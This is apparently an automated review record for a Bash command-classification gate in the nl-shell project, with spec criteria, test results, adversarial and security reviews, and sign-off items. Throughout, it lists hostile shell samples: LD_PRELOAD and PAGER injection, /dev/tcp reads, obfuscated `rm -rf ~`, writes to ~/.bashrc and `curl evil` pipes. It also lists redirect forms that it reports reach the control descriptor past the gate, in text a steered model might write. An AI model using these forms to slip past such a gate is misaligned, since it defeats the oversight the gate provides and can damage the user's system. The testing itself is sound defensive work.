# Result — issue 196 / ast-policy-gate-shell-layer

## 1. Spec (from brief.md)              ← Check verifies against THIS
- Defect / goal: 
- Success criterion: `tests/test_policy_gate.py` passes, covering:
  - `policy-gate/v1` §1.1 characters: row 30 (`ls ‮txt.exe`, U+202E in a proposal) is
    rejected; the same text typed is at least `mutating`, reason "hidden character".
    A proposal holding a lone surrogate (`ls \udcff`) is rejected.
  - §1.2 unparseable: row 31 (`if true; then`) is `mutating`, reason contains
    "unparseable".
  - §1.7 model label: a proposal labelled `destructive` for `true` is `destructive`;
    a label never lowers the class: `true` labelled `read-only` stays `mutating`. Both
    are also run with `gate.rules` monkeypatched to return `read-only` for `true`, so
    the label is checked against a class below it (labelled `destructive` ⇒
    `destructive`; labelled `read-only` ⇒ the §7 stub's `mutating`).
  - Shell-level §2: row 7 (`PAGER=sh git log`) and row 13 (`LD_PRELOAD=./x.so ls`) give a
    prefix-assignment reason; row 15 (`ls > ~/.bashrc`) an output-redirect reason, while
    `>/dev/null`, `2>&1`, `1>&2`, `>&2` add none; row 14 (`cat </dev/tcp/example.org/80`)
    a `/dev/tcp` reason; row 16 (`$'\x72m' -rf ~`) and `$(echo rm) -rf ~` a non-literal
    command word reason; `diff <(ls) <(ls)` a process-substitution reason;
    `LESSOPEN='|sh %s' less f` a prefix-assignment reason. A command word that is a path
    outside the system directories (`/tmp/rm x`, `./rm x`) gets a path reason;
    `/usr/bin/rm x` and `//usr/bin/rm x` (leading slashes collapsed, as Linux resolves
    them — v1 regression) do not.
  - §1.2 also: `case x in` is unparseable (it parses to an `ERROR` node; `if true; then`
    to `MISSING "fi"`).
  - Shell-level §3: a function definition is `session-altering`. The whole §3 name list
    (`docs/design/specs/policy-gate/v1.md:104-107`, including the `LD_*`, `GIT_*`,
    `SUDO_*`, `PYTHON*`, `PERL5*` patterns and `PS0`–`PS4`) is this child's, matched on
    every `variable_assignment` node, standalone or inside a `declaration_command`.
    Cases: standalone `PATH=x`, `IFS=x`, `LD_PRELOAD=x`, `LD_LIBRARY_PATH=x`, `GIT_DIR=x`,
    `GIT_PAGER=x`, `PS1=x`, `PYTHONPATH=x`, `NODE_OPTIONS=x` and `export PATH=./bin`
    (spec row 5's setup) are `session-altering` with a reason naming the variable. Forms
    with no plain `variable_assignment` node (`export "PATH"=x`, `read`, `printf -v`, …)
    are #197's.
  - Shell-level §5: row 25 (`echo hi >&3`) and `3>x`, `{fd}>x`, `exec 3>&-`, `>&$x`,
    `<&$fd`, `>&"$X"`, `2>&${FD}`, and a 40-digit fd number (`echo x >&4444…`) are
    rejected (a descriptor the gate cannot prove is below 3 is rejected); any
    `variable_assignment` node naming `SUDO_PROMPT` or `SUDO_ASKPASS` is rejected, reason
    containing "SUDO_" — standalone or as a prefix: row 23 (`SUDO_PROMPT=x sudo true`) and
    `SUDO_ASKPASS=/x sudo true`, and `export SUDO_PROMPT=x` (tree-sitter-bash puts a
    `variable_assignment` node inside the `declaration_command`).
  - Walk coverage: every simple command inside pipelines, lists, subshells, `if` /
    `while` / `for` / `case` bodies, function bodies and command substitutions reaches
    the command layer (asserted on the invocation records). `declaration_command`
    (`export`, `declare`, `typeset`, `local`, `readonly`) and `unset_command` nodes are
    handed to the command layer as invocations with their command word, like a `command`
    node, so child-2 can give them meaning. A test enumerates every named
    node kind from the pinned `tree_sitter.Language` and asserts each one has a handler.
  - Stdin context, v2 regression (v2's walker recorded the second stage of
    `cat <<E | X` as reading the terminal instead of the pipe, so the sudo pipe rule never
    fired): in `cat <<E | sudo tee /x` and `cat <<E | doas id`
    (here-doc body `x`), the second stage's invocation has stdin = pipe, not terminal;
    `cat <x | y` and `cat <<<x | y` agree with it. `bash <<<'rm -rf ~'` and a quoted
    here-doc record the literal text.
  - Decision C: a node kind with its handler removed (monkeypatched), a budget overrun
    (deep nesting, and a long chain of substitutions that stays under the depth limit),
    and an internal error each give `privileged`, rejected, reason "could not class".
    `classify` never raises.
  - The §7 stub proof: with `gate.rules` monkeypatched to return `read-only` for `ls`,
    `classify("ls")` is `mutating`, reason "live-session resolution not implemented"
    (this exact string is defined here, in `gate/live.py`; #198 and #192 assert on it).
    `gate.live` is called directly with a `read-only` input and returns `mutating` with
    that reason. Across all other cases, no result is `read-only`.
  - Vectors: the conformance-row cases of this test are read from
    `targets/ubuntu-26.04/gate-vectors.toml` through the new loader (not repeated inline).
    The loader rejects, with an error naming the entry, a missing `command` or `class`, a
    class outside the five, an unknown key, and invalid TOML. The file's header says it
    holds the rows landed so far and is complete (spec Conformance, `v1.md:245-249`)
    only when #192 lands.
  The gate's output has the session-log `gate` shape `{"class", "reasons", "rejected"}`
  (`docs/design/specs/session-log/v1.md`).
- Repo + branch target: eduralph/nl-shell @ main
- Scope (one logical fix) / out of scope: 

## 2. Disposition claimed               ← sign-off confirms or overrides
- Outcome: new-feature
- Confidence: medium
- Recommendation: (set by Do)

## 3. Correctness (Check — chain)
- C1 Spec: none — brief.md
- C2 Reproduction (red pre-fix): none — (no gate configured)
- C3 Change: none — patch.diff
- C4 fix verified: bundle test red pre-fix, green post-fix (pytest): pass — C4 PASS — red without the fix (211 of 211 failed), green with it
- C5 Causal adequacy: none — reviewer + human sign-off

## 4. Conformance (Check — stack)
- T1 Structure: none — (no gate configured)
- T2 security-relevant change also updates the threat model: pass — security-relevant paths touched and the threat model updated: src/nl_shell/gate/__init__.py src/nl_shell/gate/live.py sr
- T3 runtime: the whole nl-shell pytest suite on the patched worktree: pass — T3 PASS — nl-shell suite green
- T4 PR body has a user-impact opener + tracker id in both artifacts: deferred — pr-description.md not drafted yet — the substantive T4 audit of the contribution artifacts runs at publish
- T5 Judgment: none — reviewer + human sign-off
- T5 judgment: → see §5.

## 5. Advisory review (artifact-only, decorrelated)
Reviewer ran without build-notes.md. Summary:

Review the new policy-gate shell layer: parse Bash commands, preserve invocation context, and fail closed while command and live-session rules remain stubs.

| Item | Verdict | Basis |
|------|---------|-------|
| C1 Spec | PASS | The shell-only contract and sibling boundaries are explicit; no REPL integration or command allowlist is required in this cycle (brief.md:109; target/src/nl_shell/gate/__init__.py:25). |
| C2 Reproduction (red pre-fix) | PASS | The base has no gate package, and the frozen red leg executes all 211 tests and fails them for the missing functionality; this establishes absence, not a legacy behavioral regression (gate-logs/C4-verify.log:16; gate-logs/C4-verify.log:8609). |
| C3 Change | PASS | The diff stays within parser dependencies, shell-gate modules, conformance vectors, tests and threat-model documentation; command semantics remain deliberately deferred (target/src/nl_shell/gate/__init__.py:127; target/pyproject.toml:20). |
| C4 Verification (red→green) | PASS | Frozen output establishes 211 red then 211 green tests with no collection/setup errors; independent rerun is unavailable because this host lacks pytest and both parser packages, so this is log-supported verification (gate-logs/C4-verify.log:14; gate-logs/C4-verify.log:8609). |
| C5 Causal adequacy | PASS | Unknown syntax and parser disagreements cannot silently produce read-only approval; node dispatch, shared budgets, and the live stub address the declared shell-layer invariant rather than an optional-capability load-time symptom (target/src/nl_shell/gate/parse.py:334; target/src/nl_shell/gate/parse.py:1217; target/tests/test_policy_gate.py:882). |
| T1 Structure | PASS | Invocation records separate shell syntax from command rules, and all pipeline extension points are called before verdict aggregation; sibling work can replace the stubs without changing the public result shape (target/src/nl_shell/gate/parse.py:269; target/src/nl_shell/gate/__init__.py:127). |
| T2 Shape | PASS | The threat-model touch gate passed, and the updated text describes parser disagreement defenses plus the remaining dynamic-target and relative-path limitations accurately (gate-logs/T2-threat-model.log:10; target/.oss-scanner/threat_model.md:114; target/.oss-scanner/threat_model.md:130). |
| T3 Runtime | PASS | The captured whole-suite run reports 1,312 passed, one skipped and one forkpty warning; this is frozen runtime evidence, not an independently reproduced run here (gate-logs/T3-suite.log:36). |
| T4 Contribution | N/A | Contribution artifacts are absent by design during Check; the substantive user-impact/tracker audit must rerun at publish (gate-logs/T4-contribution.log:10). |
| T5 Judgment | NEEDS-HUMAN | Confirm affected-path prior art against merged history and closed/rejected work, and approve dependency licensing — the supplied target has only one synthetic base commit and no remotes, the brief names rejected work without supplying it, and tree-sitter license confirmation is expressly human-only (brief.md:139; brief.md:144; target/pyproject.toml:20). |
| Validation — fitness-to-purpose | NEEDS-HUMAN | Approve the shell-only milestone and its stricter decision-C, descriptor and quoted-hidden-character policies, and decide whether documented dynamic/relative redirect and arithmetic-assignment gaps are acceptable before downstream integration; green stub-era tests do not establish a production Bash safety boundary (brief.md:126; brief.md:184; target/.oss-scanner/threat_model.md:130; target/.oss-scanner/threat_model.md:241). |

Evidence and limits:

- Grounding used only the supplied target and bundle. `git ls-tree -r HEAD src/nl_shell/gate tests/test_policy_gate.py` returned no entries, confirming the package and tests are new. Target status matches the patch's changed surfaces; no stale-target failure was observed.
- Independent test attempts: `python -m pytest -q tests/test_policy_gate.py` failed because `python` is absent; `python3 -m pytest -q tests/test_policy_gate.py` failed because pytest is absent. Import discovery also found neither tree-sitter package. No stash was performed because neither leg could execute tests. The frozen C4 log shows actual parser-backed tests, including parse cancellation and command traversal; there is no evidence of a shim or an unmet parser dependency in that gate environment.
- The instance-scoped gate wrappers are not supplied here. Their frozen logs were inspected instead: C4 includes both full test legs, T2 confirms the threat-model update, T3 records the suite result, and T4 explicitly defers to publish. No missing-log escalation is needed.
- Prior-art investigation by affected paths returned only synthetic commit `c638c86` for `src/nl_shell/gate`, `pyproject.toml`, and `tests/test_policy_gate.py`; `git remote -v` returned nothing. Thus neither merged repository history nor closed/rejected changes can be independently settled from this bundle. No other checkout was consulted. INTEGRATION.md is not supplied; the brief's named license/sign-off requirements are retained above.
- No visual outcome is claimed: this patch has no UI wiring. In an environment with the pinned project dependencies and pytest, reproduce the focused green leg with `python -m pytest -q tests/test_policy_gate.py` from the target root; run `python -m pytest` for the suite. Policy acceptance and licensing remain human decisions even when those pass.

<!-- pdca:leaf-complete -->

### Advisory — adversary

# Adversarial review — ast-policy-gate-shell-layer (round 5)

I re-ran the proof myself instead of relying on the gate logs. I installed the pinned `tree-sitter==0.26.0` and `tree-sitter-bash==0.25.1` into a venv in my scratch directory. `tests/test_policy_gate.py` gives 211 passed against `$PDCA_TARGET`. The red leg is trivially true: `nl_shell.gate` does not exist on `main`, so every test fails on import (gate-logs/C4-verify.log). The tests call the production `classify` / `walk`; I found no mirror copy of the code. I checked the round-4 fixes against real bash 5.3.9 and the pinned grammar:

- Here-docs on one line (`|`, `&`, `;`, two `<<` on one command, a function body piped into a here-doc) all fail closed.
- Descriptor paths (`/dev/fd/3/`, `/proc/self/fd/./3`, `/proc/1/../self/fd/3`, `/proc/self/cwd/…`) are rejected.
- The parse-time cap holds: `$[`, `a=(` and `${` at the 64 KiB cap stop at about 0.52 s, and node-heavy inputs stop at 0.6 s or less.

One required fix is still open:

- NEEDS-HUMAN [impl] — **An extglob pattern in the middle of a redirect target is not rejected.** This breaks the round-4 requirement and the threat model's claim. The check `_extglob_after` (`src/nl_shell/gate/parse.py:460-469`, called at `:713`) only fires when the target word *ends* in `?*+@!` and a `(` follows. For `echo hi >/dev/fd/3@(x|)`, tree-sitter-bash parses the target as `(concatenation (word) (ERROR) (word))`, with text `/dev/fd/3@(x`. That word ends in `x`, so `_extglob_after` is False. `_pattern` (`:445-457`) gets `shape=None` from `_evaluate` because of the ERROR child, so it is False too. `target.value` is None, so the `/dev/fd` check at `:767-773` is skipped as well.
  - Gate result: `mutating`, `rejected=False`, reasons `("unparseable…", "output redirection: '>/dev/fd/3@(x'", "not allowlisted")`. `>>/dev/fd/3@(x|)` and `cat </dev/fd/3@(x|)` give the same unrejected result.
  - Real bash 5.3.9 with extglob: `exec 3>f1; echo via-ext >/dev/fd/3@(x|)` writes `via-ext` into `f1`. That is fd 3, the control channel. `3*(x)` also writes to fd 3, but the gate does catch that one, through the `*`.
  - This contradicts `.oss-scanner/threat_model.md:129-130` ("a target bash would glob, extglob (`@(…)`, `+(…)`, `!(…)`) … is rejected"). It also does not meet the round-4 sign-off item, which said: "treat a file-redirect target followed by "(" … as a pattern, **or reject any file redirect inside a tree with an ERROR node**". Neither was done for this shape. The parser does see an ERROR here, but only for the target's *content*.
  - Fix: in `_Walker.redirect`, treat the target as a pattern when it contains an `ERROR` descendant or any unquoted `?(`/`*(`/`+(`/`@(`/`!(`. Simpler: reject every `file_redirect` when `self.result.unparseable` is set, the same way the here-doc path already does at `:721-724`.
  - Test: add `echo x >/dev/fd/3@(x|)`, `echo x >>/dev/fd/3@(x|)` and `cat </dev/fd/3@(x|)` to the extglob cases at `tests/test_policy_gate.py:309-314`. All four current cases there put the extglob at the end of a word, so this shape is never exercised.

- NEEDS-HUMAN [human] — **A tilde target and a cd-then-relative target both reach fd 3. This is disclosed, but the human should rule on it with the open `>$F` question.** In real bash, `exec 3>f4; echo via-tilde >~/../../../../../../dev/fd/3` writes to `f4`. So does `(cd /dev/fd; echo via-cd >3)`. The gate classes both as `mutating`, not rejected:
  - In `_descriptor_path` (`src/nl_shell/gate/parse.py:562-563`), the value starts with `~`, not `/`, so the function returns None.
  - In `cd /dev/fd; echo hi >3`, the target `3` is relative.
  - `threat_model.md:131-132` does disclose both: "A target the gate cannot read (`>$F`) or a relative path in a directory such as `/dev/fd` is not rejected".
  - The cwd case is inconsistent with this round's `/proc/<pid>/cwd/` rule (`parse.py:91-93`, `:575-576`). That rule rejects reaching fd 3 through an unknown working directory. The same move with a relative path in the same line is allowed, even though the earlier `cd /dev/fd` is visible to the gate.
  - This is the same undecided scope question the sign-off kept open (non-literal / unknowable targets), so I am not filing it as a builder defect. Impact today is limited: the confirm prompt still shows, and the gate is not wired into the REPL yet.

- Could not refute:
  - The heredoc-ordering and nesting checks (`parse.py:725-730`, `:749-754`, `:1014-1020`).
  - `${ cmd; }` detection, which runs before the parse (`:342-344`). A `$\⏎{` form is caught by `_check_continuations`.
  - Moved and named descriptors: `>&3-` and `{a[0]}>` are rejected.
  - Decision C: `classify` catches every `Exception` (`src/nl_shell/gate/__init__.py:94-97`).
  - The C4 and T3 gate claims in `check-gates.json`: I reproduced the 211 green results locally, and gate-logs/T3-suite.log shows 1312 passed.

<!-- pdca:leaf-complete -->

### Advisory — security-review

# Security review (advisory): ast-policy-gate-shell-layer, round 5

**Attacker-reachable inputs this diff touches:** the command text given to `nl_shell.gate.classify`. That means the model's proposal (threat model item 5) and, through it, anything item 1–3 text steered it to write. Typed input counts too (trusted, but it goes through the same parser). The gate is not wired to the REPL yet (#78). The command layer is a stub that makes every command at least `mutating`, so nothing can be classed `read-only` today. Each finding is therefore rated by what it would allow once #197/#198 land.

**Verdict: no new finding.** Each round-4 fix holds against real bash, and the patch's tests cover the attacker-reachable forms.

How I checked: I ran the patched gate with the pinned `tree-sitter==0.26.0` / `tree-sitter-bash==0.25.1`, using an interpreter that has them. Each probe was compared against real GNU bash 5.3.9. The probe scripts are in this leaf's `probe/` directory.

## What I checked

- **Two here-documents on one line, and body order** (`src/nl_shell/gate/parse.py:720-734`, `:749-754`, `:1014-1020`, `:1053-1065`). I ran a differential test with 25 here-document shapes × 6 joiners (`;`, `&`, `&&`, `||`, `|`, newline): 150 scripts. Shapes included braces, subshells, `if`/`while`/`for`/`case` bodies, `$(cat <<B …)` inside A's line, backquotes, `[[ $(…) ]]`, functions, quoted delimiters and `<<-`. Each script hides `touch PWN` on a line that bash runs. A bypass would be: bash creates `PWN`, the gate does not fail closed, and no invocation has `touch` as its command word. **No bypass found.** 34 scripts ran the hidden line and the gate failed closed; 14 ran it and the gate recorded the `touch` invocation. 31 more edge cases also gave no bypass: CRLF delimiters, `E\⏎`, unbalanced `$(`, `${`, `$((` or a backquote across the delimiter line, `<<-` with a space before the tab, `cat <<E <<E`, `$x`/`${x}` in the delimiter, substitutions in the delimiter, `$[$(…)]` and `\$(x)$(…)` in the body.
- **Extglob, glob and brace targets; `/proc/<pid>/cwd`; `/proc/<pid>/root`** (`parse.py:460-469`, `:557-583`, `:756-773`). I ran 50 candidate redirections under `bash -O extglob` with fd 3 open to a file, and checked whether `PWN` reached fd 3. Every write through a literal target was rejected. That covers `>/dev/fd/!(0|1|2|4|…)`, `3@()`, `3*()`, `3?()`, `3+()`, `[3]`, `/dev/f[d]/3`, `\3`, `"3"`, `/de""v/fd/3`, the `./`, `//` and `..` forms through `/sys`, `/run`, `/var/run`, `/proc/self/fdinfo` and `/proc/self/map_files`, and `>|`, `&>>`, `<>`, `2>…>&2`, and `exec 1>/dev/fd/3`. The only misses are the documented ones below.
- **Parse budget** (`parse.py:355-379`). I timed inputs at the 64 KiB cap. `$[`, `a=(`, `${` and `a=(b=(…` each stopped at about 0.51 s with "could not class: parse budget exceeded". 20 other shapes (`$((`, `[[`, `((`, `"$(`, `<(`, a run of backquotes, `${a[`, `${x/`, many redirections, many here-documents, many continuations, many words, long `case`, nested `{`/`for`) finished in 0.02–0.68 s, either classed or failed closed. After a cancelled parse, `classify("echo hi >&3")` and `classify("ls")` give the same results as before, so `parser.reset()` (`:375`) leaves no state behind.
- **Tests.** The attacker forms are in the tests: the joined here-documents (`tests/test_policy_gate.py:690-693`), the order check on its own with the nesting check disabled (`:702-717`), extglob, `/proc/*/cwd` and `/proc/*/root` (`:307-324`), and the slow-parse timing (`:783-797`). The friendly-path counter-cases are there too (`:351-360`), so the new rules are not just over-rejecting.

## Notes (known gaps, not findings)

- Literal-looking redirections the gate still lets through without rejecting, all as documented. Each one wrote to fd 3 in real bash. Only these two kinds are left:
  - **Non-literal targets.** `echo PWN >/proc/$$/fd/3`, `>/proc/self/task/$BASHPID/fd/3`, `>${X:-/dev/fd/3}`, `>/dev/fd/${X:-3}`; also `>/dev/fd/$'3'` and `>~/../../dev/fd/3`. These are classed `mutating` with "output redirection" and `rejected=False`. The patch's threat-model text says so (`.oss-scanner/threat_model.md:130-131`, "A target the gate cannot read (`>$F`) … is not rejected by this rule"), and the human explicitly left this scope question open this round. I'm not re-raising it. One input for that decision: `/proc/$$/fd/3` is a short, natural form a steered model could produce, and it needs no unusual quoting.
  - **`eval 'echo PWN >&3'`**, which also writes to fd 3. That is command-layer meaning (#197), and the stub floors it to `mutating` today.
- **Toolchain.** The target sandbox has no `tree_sitter`. I ran the probes with the pdca checkout's existing virtualenv interpreter, which has the exact pinned versions. All `path:line` citations are on the target source at `$PDCA_TARGET`.

No NEEDS-HUMAN items from this review.

<!-- pdca:leaf-complete -->

## 6. NEEDS-HUMAN — items the human must clear before sign-off
- [ ] T5 Judgment — Confirm affected-path prior art against merged history and closed/rejected work, and approve dependency licensing — the supplied target has only one synthetic base commit and no remotes, the brief names rejected work without supplying it, and tree-sitter license confirmation is expressly human-only (brief.md:139; brief.md:144; target/pyproject.toml:20).
- [ ] Validation — fitness-to-purpose — Approve the shell-only milestone and its stricter decision-C, descriptor and quoted-hidden-character policies, and decide whether documented dynamic/relative redirect and arithmetic-assignment gaps are acceptable before downstream integration; green stub-era tests do not establish a production Bash safety boundary (brief.md:126; brief.md:184; target/.oss-scanner/threat_model.md:130; target/.oss-scanner/threat_model.md:241).
- [ ] **An extglob pattern in the middle of a redirect target is not rejected.** This breaks the round-4 requirement and the threat model's claim. The check `_extglob_after` (`src/nl_shell/gate/parse.py:460-469`, called at `:713`) only fires when the target word *ends* in `?*+@!` and a `(` follows. For `echo hi >/dev/fd/3@(x|)`, tree-sitter-bash parses the target as `(concatenation (word) (ERROR) (word))`, with text `/dev/fd/3@(x`. That word ends in `x`, so `_extglob_after` is False. `_pattern` (`:445-457`) gets `shape=None` from `_evaluate` because of the ERROR child, so it is False too. `target.value` is None, so the `/dev/fd` check at `:767-773` is skipped as well.
- [ ] **A tilde target and a cd-then-relative target both reach fd 3. This is disclosed, but the human should rule on it with the open `>$F` question.** In real bash, `exec 3>f4; echo via-tilde >~/../../../../../../dev/fd/3` writes to `f4`. So does `(cd /dev/fd; echo via-cd >3)`. The gate classes both as `mutating`, not rejected:
- [ ] **The tracker record is missing, so the problem statement and the "ignored context" check could not be done.** `notes.json` and `sources/` are not in the bundle I was given. Several parts of the brief rest only on that thread: "decision A's floor", "decision B (child-2)", "Decision C", "child-2" and "child-3", the sibling split (#190/#191/#192) and the "v2 regression". None of the decisions A/B/C appear anywhere in the target. A grep for `decision [ABC]` and `could not class` matches only `.github/triage/triage_priority.py:42,402`, which is unrelated. The human should confirm these decisions really are in the thread, or the brief should state them inline.
- [ ] **The "§7 stub proof" criterion cannot fail.** The brief ships `rules.py` as a stub where "every simple command is `mutating`, reason 'not allowlisted'". With that stub, nothing reaches `gate/live.py` as `read-only`. So "no case returns `read-only`" passes even if `live.py` is deleted or returns `read-only`. The same applies to "§1.7 … a label never lowers the class": every command is already at least `mutating`, so a label below that can never be observed lowering anything. The tests need to exercise `live.py` directly, for example by monkeypatching `rules` to return `read-only` and asserting that live turns it into `mutating` with "live-session resolution not implemented". The label test needs a matching fixture. Otherwise these two bullets pass whether or not the code works.
- [ ] **Decision C and the fd rule go beyond the spec. The brief calls them restorations; they are new rules.** `policy-gate/v1` has no internal-error or budget rule. Decision C ("`privileged`, rejected, reason 'could not class'") is new. The spec rejects only "file descriptor 3 or higher" (`docs/design/specs/policy-gate/v1.md:126`). The brief also rejects any descriptor the gate "cannot prove is below 3" (`>&$x`, `<&$fd`, `2>&${FD}`). Both are stricter, so they are probably compatible changes. But the spec's Versioning section (`v1.md:238-241`) says raising a class "MUST be reviewed by a human". The brief does not flag either one for sign-off, and does not plan a spec edit to record them.
- [ ] **The §3 variable rule is underspecified and only partly tested.** The success criterion tests standalone assignments to `PATH`, `IFS`, `LD_PRELOAD` and `GIT_DIR` only. Spec §3 (`v1.md:104-107`) lists about 20 names and patterns (`PS0`–`PS4`, `LD_*`, `GIT_*`, `SUDO_*`, `PYTHON*`, `PERL5*`, `NODE_OPTIONS`, …) and covers them "standalone **or exported**". The brief applies the `variable_assignment`-inside-`declaration_command` handling only to `SUDO_*`. It never says whether `export PATH=./bin` (the setup for spec row 5) gets `session-altering` from the shell layer, or ends up as just `mutating` from the stub, which loses the session-altering warning. The Scope section also never says whether the full §3 list is in this child or in child-2. Do will have to guess.
- [ ] **`gate-vectors.toml` and its loader are a hidden second change that no test checks.** Scope adds `targets/ubuntu-26.04/gate-vectors.toml` "with this child's rows and a vector loader in the style of `src/nl_shell/targets.py:145-247`". No success-criterion bullet says the tests read their cases from that file, or tests the loader (missing file, bad TOML, schema). That is new data, a new module and new review surface with no red→green test. The spec also says a target's vectors file "MUST cover every row" (`v1.md:245-249`), so a partial file under that name does not meet the spec. Either drop it, or add a criterion such as "the tests read every case from the file; the loader rejects malformed entries" and say how the file relates to the full-row requirement.
- [ ] **Two citations do not resolve in the target.** `engine/scripts/run-verify.sh:196` (Falsifiability) and `results/issue_189/iteration-v2/patch.diff` with `parse.py:397,411` (Prior-art) are not in `$PDCA_TARGET`. A glob of `engine/**` and `results/**` matches nothing. They probably live in the PDCA harness checkout. The rule that Do "must cite path:line on the target branch" can't be applied to them, and a Do agent grounded on the target can't open them. Prior-art also says the v2 here-doc handling "is the bug listed above", but the brief never states that bug. The only mention is the bullet header "Stdin context, v2 regression". One sentence describing the v2 defect (stdin of the second pipeline stage recorded as terminal after a here-doc) would close the gap.
- [ ] **The §1.1 check is stricter than the spec, and the brief doesn't say so.** The brief reuses `render.has_hidden` (`src/nl_shell/render.py:136`). That function ignores quoting and covers Cf/Co/Cn/default-ignorable/surrogates (`render.py:113-127`). The spec forbids the listed characters only "outside quotes" (`v1.md:59-61`). That is fine for safety, since it only raises the class or rejects. But it means a proposal like `echo '‮'` is rejected, which differs from the spec text. A sign-off note should record that this deviation is deliberate.
- [ ] **These pinned-version claims can't be checked from the target and are load-bearing.** "tree-sitter-bash 0.25.1 has 59" named node kinds, the compatibility of `tree-sitter==0.26.0` with `tree-sitter-bash==0.25.1`, and "`case x in` parses to an `ERROR` node; `if true; then` to `MISSING "fi"`" are all assertions about third-party wheels. Nothing in the repo backs them up (`pyproject.toml:13-17` has no tree-sitter today). If either pin is wrong, Do stalls on the first install. The success criterion already makes the node-kind test enumerate the kinds at run time, so the brief should drop the hard-coded "59" rather than imply a test depends on it. The pins should be confirmed with one `pip install` before Do starts. The licence question is already deferred to sign-off.
- [ ] size backstop — this slice is behaving oversized: patch is 107 KB (threshold 100 KB); 4 round(s) already spent (threshold 2). Recommend answering `iterate-plan` at sign-off and authoring the split in the re-plan (`pdca split`), rather than `iterate-do`: a slice that is too big yields implementation-shaped findings every round, and splitting authors briefs, which is Plan's beat.
- [ ] T5 Judgment — Approve decision C, stricter descriptor rejection and quote-blind hidden-character rejection, confirm parser dependency licensing, and settle affected-path prior art across merged and closed/rejected work — the disposable repository has only one base commit and no remotes, so complete history cannot be checked; target/docs/design/specs/policy-gate/v1.md:238, target/pyproject.toml:19, brief.md:127 and brief.md:139.
- [ ] **Assignments the parser does not give a `variable_assignment` node skip §3 and §5.** The brief limits the rule to `variable_assignment` nodes (`parse.py:701-711`). But the forms below are syntax the shell layer walks, not commands, so #197's command layer will never see them as invocations. `for` and `expansion` are plain pass-through containers (`parse.py:736-749`):
- [ ] **T2 is unverifiable: no threat-model update.** `gate-logs/T2-threat-model.log` shows the whole new gate package changed with no edit to `.oss-scanner/threat_model.md`. The brief cites that model's Critical row (`:296`) and High row (`:303`) as the invariant this work restores. A human should decide whether the model needs a new row now (the gate as a parse-differential surface: tree-sitter vs bash, see `cat <<E; rm x` below) or only when #78 wires the gate into the REPL.
- [ ] **No effect in this diff. It becomes High ("pipes into sudo" must be rejected, ADR-0015) once child-2's sudo-pipe rule reads `Invocation.stdin`.** At `src/nl_shell/gate/parse.py:714-719`, a function body is always walked with `stdin=TERMINAL`. But the body runs with the stdin of the call site. Input: the model's proposal. Example: `f() { sudo tee /x; }; cat <<E | f` (here-doc body `x`). The call `f` gets stdin = pipe, but the `sudo tee /x` invocation is recorded as reading the terminal. That is the same mistake the brief cites as v2's here-doc pipeline bug, moved into a function body. Calling `f` is opaque and the definition is `session-altering`, so the command is still confirmed. But a pipe-into-sudo *rejection* built on this field would not fire, and the sudo password could be fed from the pipe. The brief's `Stdin` sources (terminal / pipe / file / here-doc / here-string) have no "unknown" value for this case. Adding one, or making #197 treat function-body invocations as stdin-unknown, changes the contract the siblings depend on. That is a scope call for the human, not a builder iteration.
- [ ] T5 Judgment — Confirm dependency licensing and complete affected-path prior-art review across merged and closed/rejected work before sign-off — the brief flags the licensing decision, while this target has one synthetic base commit, no remotes and no gate-path history; closed-work evidence and INTEGRATION §4 are not supplied (brief.md:142, brief.md:145; target/pyproject.toml:20).
- [ ] **Scope of "cannot prove": non-literal redirect targets and unparseable text.** The new threat-model line (`threat_model.md:120-121`) promises rejection of any redirection the gate cannot prove uses only fds 0-2. The code keeps two cases at `mutating`, not rejected. (1) A non-literal output target, `echo x >"$f"` or `>/proc/$$/fd/3` (`parse.py:519-525`): its value is unknown, so it could be `/dev/fd/3`. (2) Text that parses with an `ERROR` node (`parse.py:788`, `__init__.py:124-125`): a `>&3` that tree-sitter folds into the `ERROR` node never becomes a `file_redirect`, so it gets only "unparseable" (`mutating`). Until #191 that is an accepted bypass class (`threat_model.md:227-228`). Both still need a confirm. Rejecting every non-literal output target is a large behaviour change, so a human should decide which way to go. Option one: narrow the threat-model wording to literal targets on a parseable tree. Option two: add backstops, such as rejecting non-literal output targets, and rejecting unparseable text whose bytes match `[<>]&|/dev/fd/|/proc/[^/]*/fd/`. I found no concrete grammar input for (2), and it is unconfirmed without the toolchain.

## 7. Proven / not proven
- Proven by which oracle: gates overall = pass (stub oracles).
- Unproven / needs manual run: anything flagged in §6.

## 8. Ready-to-ship attachments
- patch.diff
- tracker-comment.md     (ALWAYS, every tracker item)
- build-notes.md         (builder rationale — for the human, not the reviewer)

## 9. Check sign-off                     ← human completes Check here
- Disposition confirmed / overridden:
- Outcome: iterated-to-Do
- Iteration delta (if iterating): Human chose iterate-do and again explicitly overrode the size-backstop recommendation (iterate-plan); do not re-split this round. Fix the confirmed round-5 adversary finding, with tests: - An extglob pattern in the MIDDLE of a redirect target is not rejected: `echo hi >/dev/fd/3@(x|)` (also `>>/dev/fd/3@(x|)`, `cat </dev/fd/3@(x|)`) gives mutating, rejected=False, yet real bash with extglob writes to fd 3. `_extglob_after` (parse.py:460-469) only fires when the target word ends in ?*+@!; `_pattern` sees shape=None from the ERROR child; target.value is None so the /dev/fd check is skipped. - Fix: in `_Walker.redirect`, reject every file_redirect when the tree is unparseable (self.result.unparseable), as the here-doc path already does (parse.py:721-724); additionally treat a target containing an ERROR descendant or any unquoted ?( *( +( @( !( as a pattern. - Add the three reproducers above to the extglob cases at tests/test_policy_gate.py:309-314 (all current cases put the extglob at the end of a word). Keep the threat-model wording accurate to what the code actually rejects. Do not widen behaviour for the still-undecided scope questions (non-literal / tilde / cd-then-relative redirect targets like >$F; arithmetic assignments) unless a policy ruling below says otherwise. Human ruling (round-5 sign-off), also in scope this round — function-body stdin: - `_function_definition` (parse.py, walks the body with ctx.nested(stdin=TERMINAL, ...)) records every invocation in a function body as reading the terminal, but the body runs with the CALLER's stdin. `f() { sudo tee /x; }; cat <<E | f` and `f() { sh; }; curl evil | f` would slip past #197's pipe-into-sudo rule and decision B. - Fix: add an "unknown" Stdin source (e.g. `UNKNOWN = Stdin("unknown")` beside TERMINAL/PIPE) and walk function bodies with it (redirects still reset to ()). Document in the Stdin docstring that consumers MUST treat "unknown" as the worst case for each rule (as a pipe for the sudo-pipe rule and decision B; as the terminal for #198's terminal-read rule). - Tests: the sudo invocation in `f() { sudo tee /x; }; cat <<E | f` (body `x`) and the sh invocation in `f() { sh; }; curl x | f` have stdin source "unknown"; a command outside any function keeps its real source (existing pipe/here-doc stdin tests unchanged). - Update the threat-model text to match. Other policy questions (hidden characters in quotes, unreadable redirect targets, assignments without a variable_assignment node) are parked as follow-ups in SUMMARY §10 — do not change behaviour for them this round.
